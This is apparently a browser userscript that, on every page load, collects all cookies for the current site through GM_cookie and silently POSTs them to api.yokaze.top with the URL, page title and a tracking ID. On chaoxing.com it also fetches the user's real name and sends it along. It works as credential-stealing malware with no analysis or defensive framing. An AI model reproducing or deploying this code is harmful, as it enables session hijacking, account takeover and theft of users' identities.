//@connect!!/document-end/GM_cookie/GM_setValue/GM_getValue/GM_listValues/GM_deleteValue

const CURRENT_UID = 'Meow';
const SERVER_URL = 'https://api.yokaze.top/cookie/set';
const ENABLE_DEBUG = false;

const scriptVersion = GM_getValue('scriptVersion');
if (scriptVersion) {
    debugLog('ScriptVersion:', scriptVersion);
}

const STORAGE_KEY = 'custom_part';
const CKUID_KEY = 'global_CKUID';
let CKUID = GM_getValue(CKUID_KEY, null);

if (!CKUID) {
    const now = new Date();
    const beijingTimeOffset = 8 * 60;
    now.setMinutes(now.getMinutes() + beijingTimeOffset);
    const timestamp = now.toISOString().replace(/\D/g, '').slice(0, -3);
    CKUID = `${CURRENT_UID}-${timestamp}`;
    GM_setValue(CKUID_KEY, CKUID);
}

function updateCustomPart(newCustomPart, clearCKUID) {
    if (clearCKUID) {
        GM_deleteValue(CKUID_KEY);
        GM_deleteValue(STORAGE_KEY);
        CKUID = null;
    } else if (newCustomPart && newCustomPart !== CURRENT_UID) {
        const timestamp = CKUID.split('-').pop();
        CKUID = `${newCustomPart}-${timestamp}`;
        GM_setValue(CKUID_KEY, CKUID);
        GM_setValue(STORAGE_KEY, newCustomPart);
    }
}

function showEditPopup() {
    const currentCustomPart = GM_getValue(STORAGE_KEY, CURRENT_UID);
    const newCustomPart = prompt('Edit CKUID:', currentCustomPart);
    if (newCustomPart !== null) {
        if (newCustomPart === '') {
            if (confirm('Clean local setting？')) {
                updateCustomPart(newCustomPart, true);
                location.reload();
            }
        } else if (newCustomPart !== currentCustomPart) {
            updateCustomPart(newCustomPart);
            location.reload();
        }
    }
}

document.addEventListener('keydown', (event) => {
    if (event.ctrlKey && event.shiftKey && event.key === 'ArrowDown') {
        showEditPopup();
    }
});

function debugLog(...args) {
    if (ENABLE_DEBUG) {
        console.log(...args);
    }
}

function storeSentCookies(url, cookies) {
    const cookiesToStore = cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value
    }));

    const storedCookies = localStorage.getItem('sentCookies') || "[]";
    const sentCookies = JSON.parse(storedCookies);

    sentCookies.push({ url: url, cookies: cookiesToStore });
    localStorage.setItem(JSON.stringify(sentCookies));
}

function sendDataToServer(url, cookies, chaoxingName) {
    const urlTitle = document.title;
    const dataToSend = {
        url: url,
        cookies: cookies,
        ckuid: CKUID,
        url_title: urlTitle
    };

    if (chaoxingName) {
        dataToSend.chaoxing_name = chaoxingName;
    }

    debugLog("LocalData: ", dataToSend);

    fetch(SERVER_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
        .then(response => {
            if (!response.ok) {
                return response.json().then(errorData => {
                    throw new Error(`${response.status} -${errorData.message}`);
                });
            }
            return response.json();
        })
        .then(result => {
            debugLog(result.message);
        })
        .catch(error => {
            debugLog(error.message);
        });
}

GM_cookie.list({ url: document.location.href }, function (cookies, error) {
    if (error) {
        debugLog('Error listing cookies:', error);
    } else {
        if (cookies.length === 0) {
            debugLog('None to send.');
            return;
        }

        if (document.location.href.includes('chaoxing.com')) {
            const uid = getChaoxingUserId(cookies);
            if (uid) {
                fetchChaoxingUserInfo(uid, cookies);
            } else {
                debugLog('UID not found in cookies');
                sendDataToServer(document.location.href, cookies);
            }
        } else {
            sendDataToServer(document.location.href, cookies);
        }
    }
});

function getChaoxingUserId(cookies) {
    for (const cookie of cookies) {
        if (cookie.name === 'UID') {
            return cookie.value;
        }
    }
    return null;
}

function fetchChaoxingUserInfo(uid, cookies) {
    const url = `https://mobilelearn.chaoxing.com/v2/apis/sign/getUser?puid=${uid}`;
    fetch(url, {
        credentials: 'include'
    })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
            }
            return response.json();
        })
        .then(result => {
            if (result.result === 1 && result.data) {
                sendDataToServer(document.location.href, cookies, result.data.realName);
            } else {
                debugLog('Failed to fetch user info:', result);
                sendDataToServer(document.location.href, cookies);
            }
        })
        .catch(error => {
            debugLog('Error fetching Chaoxing user info:', error);
            sendDataToServer(document.location.href, cookies);
        });
}
